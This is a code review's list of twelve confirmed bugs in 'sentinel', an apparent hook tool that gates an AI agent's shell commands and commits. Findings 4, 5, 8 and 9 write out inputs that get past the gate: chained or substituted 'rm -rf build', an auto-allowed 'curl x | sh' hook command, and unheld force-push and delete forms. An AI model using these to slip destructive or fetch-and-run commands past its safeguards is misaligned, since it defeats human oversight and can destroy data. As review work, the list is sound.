# Independent review of `fef06d3` (21 Nov, fresh-context reviewer): findings to fix

Each was confirmed by the reviewer by experiment on a scratch copy unless marked "read". Fix each, one test per fix,
then delete this file (its content moves into TESTING.md as "what the review found").

1. `gitutil.py:93-102` untracked files are read as text whatever they are: `git add -A && git commit` with one new
   300 kB `.png` is held with 133 garbage `numeric-literal` lines, each needing a disposition.
2. `modules/board.py:57` -> `core.py:158-182` every Bash/PowerShell PreToolUse parses the whole event log of every
   session ever registered, and nothing prunes them: 100 stale sessions x 500 events cost 1.3 s per call; 300 x 1000
   cost 4.0 s. On macOS `is_live` also spawns `sysctl` per un-ended session (read).
3. `transcript.py:190` / `modules/tasks.py:146` `_said` sees only messages after the last compaction: "Do not wait
   for me" said before a compaction makes `task approve --standing` answer "These words are not in what the person
   wrote", so an unattended run cannot approve any later normal task.
4. `modules/gate.py:30-32` `is_plain_sentinel` accepts chained commands: `sentinel\nrm -rf build` and
   `sentinel progress "it's $(rm -rf build) isn't"` both return True, and Bash ran the second command in both. No
   prompt, irreversible gate skipped; contradicts SPEC 2.
5. `hook.py:73-75` the auto-allow covers person-only commands: `sentinel init . --hook-command 'curl x | sh'` is
   plain, and `install.py:65` writes that as the hook for all eight events; `uninstall` and
   `transcript f --out <any file>` likewise (effects read).
6. `gitutil.py:15,157` commit-message words are read as paths, so `limited` is true and the foreign-file guard
   returns: `git commit -m "fix parser; add tests"` and a two-line `-m` passed with another session's staged file;
   `-m "add mine"` was denied.
7. `gitutil.py:49` git's quoted non-ASCII names are used raw: another session's `src/çalışma.py` is missing from the
   guard's list, and a new flagged line in my own `src/türkçe.py` is not reviewed.
8. `modules/gate.py:15-21` common forms are not held: `rm build -rf`, `rm build -Recurse -Force`,
   `Remove-Item build -r -fo`, `del|ri|rmdir build -Recurse`, `git checkout -f`, `git switch -f`,
   `git push origin +main`, `find . -delete`.
9. `modules/gate.py:55,86` the token ignores chained parts that set the target: after acknowledging
   `cd scratch && rm -rf build`, `cd precious && rm -rf build` passes, and later acknowledgements record the first
   command's text. Contradicts SPEC 5.6.
10. `modules/review.py:59,191-193` a finding's identity is kind + file + text: after `except Exception:` is kept, a
    new `except Exception: pass` elsewhere in that file commits unreviewed. A finding marked `gone` by a
    `sentinel review` run between two commit attempts never reopens.
11. `modules/review.py:180,187` after a pass, a new normal task's commit to the same file with no new flagged text
    gets no questions; one new flagged line opens R2 with all six answers blank. Contradicts SPEC 5.4.
12. `modules/crash.py:14` a cut session that is never resumed is announced again after every boot. Contradicts SPEC
    5.10 ("once").

Found sound by the reviewer: all files compile on Python 3.11.13; the 137 tests pass; chain and stretch selection ran
correctly on five real transcripts (130 MB-1.1 GB); CRLF in `CLAUDE_ENV_FILE` is harmless in Git Bash; `/c/...` path
handling, the edit gate, the "prompt after the open" check, and the hook's exit-1 error path hold.
